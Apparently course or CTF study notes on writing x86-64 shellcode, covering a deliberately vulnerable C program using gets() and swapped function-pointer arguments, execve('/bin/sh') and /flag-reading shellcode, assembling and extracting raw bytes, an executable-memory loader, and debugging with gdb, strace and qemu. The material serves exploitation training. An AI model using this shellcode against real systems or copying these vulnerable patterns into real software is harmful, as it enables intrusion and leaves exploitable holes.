
How does shellcode get injected

```
void bye1() {puts ("Goodbye!"); }
void bye2() {puts ("farewell"); }
void hello(char *name, void (*bye_funct)())
{
printf("Hello %s!\n", name);
bye_func();
}
int main(int argc, char **argv)
{
	char name[1024];
	gets(name);
	srand(time(0));
	if (rand() %2) hello(bye1, name);
	else hello(name, bye2);
}
```

As above, function bye2 will work but bye1 allows us to directly inject shellcode to the application as the parameters bye1 and name are mixed up.

The typical goal of shellcode is to run `execve("/bin/sh", NULL, NULL)`

`mov rax, 59 # The syscall number of execve`
`lea rdi, [rip+binsh] # points to the first argument of execve at the /bin/sh string`
`mov rsi, 0  # makes the 2nd argument`
`mov rdx, 0 # makes the 3rd argument`
`syscall # triggers the system call
`binsh: # A label marking where the /bin/sh string is`
	`.string "/bin/sh"`

Thus: "shellcode"


### Tangent: Data in your CODE

You can put data in your code:

`.string "/bin/sh"` ???

You can intersperse arbitrary data in shellcode:

`.byte 0x48, 0x45, 0x4c, 0x4c, 0x4f # "HELLO"`
`.string "HELLO" # "HELLO\0"`

Other ways to embed data

`mov rbx, 0x0068732f6e69622f # move "/bin/sh\0" into rbx`
`push rbx`
`mov rdi, rsp` # point rdi at the stack


### Non shell shellcode

Can just read flag directly

`sendfile(1, open("/flag", NULL), 0, 1000)`

Uses file descriptors

### Building Shellcode

Write shellcode as assembly

```
.global _start_
_start:
.intel_syntax noprefix
	mov rax, 59 # The syscall number of execve
	lea rdi, [rip+binsh] # points to the first argument of execve at the /bin/sh string
	mov rsi, 0  # makes the 2nd argument
	mov rdx, 0 # makes the 3rd argument
	syscall # triggers the system call
binsh: # A label marking where the /bin/sh string is
	.string "/bin/sh"
```

Then assemble!

`gcc -nostdlib -static shellcode.s -o shellcode-elf

This is an elf with your shellcode as it's .text - It needs to be extracted

`objcopy --dump-section .text=shellcode-raw shellcode-elf`

The resulting shellcode-raw file contains the raw bytes of your shellcode
This is what would be injected as part of exploits


### Running Shellcode (Replication exotic conditions)

If you need to replicate exotic conditions in ways that are too hard to do as preamble for your shellcode, you can build a shellcode loader in c

```
page =mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
read(0, page, 0x1000);
((void(*)())page)();
```

Then `cat shellcode-raw | ./tester`

### Debugging shellcode: strace

Usage:
`strace <binary>`

This can show you at a high level what your shellcode is doing or not doing


### Debugging shellcode: GDB

Caveats
- use `x/5i $rip` to display the next 5 instructions
- examine qwords (`x/gx $rsp`), dwords `x/2dx $rsp`, halfwords `x/4hx $rsp` and bytes `x/8bx $rsp`
- step one instructions (follow call instructions) si NOT s
- step one instruction (Step over call instructions) ni NOT n
- break: `break *0x400000`
	- can use labels
	- `label1:`
	- `break label1
- run, continue and reverse work as expected
Hardcore breakpoints
- breakpoints are implemented with the int3 instruction
- place them anywhere
- useful to catch beginning of execution

### Shellcode for other architectures

Our way of building shellcode translates well to other architectures

`amd64: gcc -nostdlib -static shellcode.s -o shellcode-elf`
`mips: mips-linux-gnu-gcc -nostdlib shellcode-mips.s -o shellcode-mips-elf`

Similarly, we can run cross-architecture shellcode with an emulator

`amd64: ./shellcode`
`mips: qemu-mips-static ./shellcode-mips`


Useful qemu options:
`-strace`
`-g 1234` - Wait for gdb connection on port 1234. Connect with `target remote localhost:1234 in gdb-multiarch`